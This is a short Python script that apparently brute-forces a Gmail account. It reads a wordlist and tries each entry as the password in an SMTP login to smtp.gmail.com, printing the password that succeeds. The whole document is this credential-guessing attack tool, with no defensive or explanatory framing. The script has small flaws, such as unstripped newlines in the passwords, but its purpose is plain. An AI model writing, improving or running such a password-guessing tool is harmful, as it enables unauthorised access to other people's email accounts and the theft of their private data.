import smtplib

smtpserver=smtplib.SMTP('smtp.gmail.com',587)
smtpserver.ehlo()
smtpserver.starttls()

user=input("Enter Gmail:")
#wordlist=raw_input("Dic:")
wordlist=open("wordlist.txt.txt","r")

for password in wordlist:
    try:
        smtpserver.login(user,password)
        print("[+] Password Found: %s" % password)
        break;
    except smtplib.SMTPAuthenticationError:
        print("[!] Password incorrrect: %s" % password)